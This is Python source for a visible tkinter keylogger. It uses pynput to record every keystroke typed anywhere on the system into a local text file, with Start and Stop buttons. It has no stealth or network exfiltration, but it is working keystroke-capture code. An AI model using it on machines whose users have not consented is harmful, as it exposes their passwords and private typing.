import tkinter as tk
from tkinter import filedialog, messagebox
from pynput import keyboard

class Keylogger:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")

        self.main_frame = tk.Frame(root)
        self.main_frame.pack(padx=20, pady=20)

        self.title_label = tk.Label(self.main_frame, text="Keylogger", font=("Helvetica", 16, "bold"))
        self.title_label.grid(row=0, column=0, columnspan=2, pady=(0, 20))

        self.status_label = tk.Label(self.main_frame, text="Status: Not Logging", font=("Helvetica", 12))
        self.status_label.grid(row=1, column=0, columnspan=2, pady=(0, 20))

        self.start_button = tk.Button(self.main_frame, text="Start Logging", font=("Helvetica", 12),
                                      command=self.start_logging, width=15)
        self.start_button.grid(row=2, column=0, pady=10, sticky="e")

        self.stop_button = tk.Button(self.main_frame, text="Stop Logging", font=("Helvetica", 12),
                                     command=self.stop_logging, width=15)
        self.stop_button.grid(row=2, column=1, pady=10, sticky="w")
        self.stop_button.config(state=tk.DISABLED)

        self.log_file = None
        self.listener = None

    def start_logging(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if not file_path:
            return

        try:
            self.log_file = open(file_path, 'a')
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.status_label.config(text="Status: Logging")
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start logging: {e}")

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None

        if self.log_file:
            self.log_file.close()
            self.log_file = None

        self.status_label.config(text="Status: Not Logging")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def on_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)
        if self.log_file:
            self.log_file.write(key_str)
            self.log_file.flush()

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    root = tk.Tk()
    keylogger = Keylogger(root)
    keylogger.run()
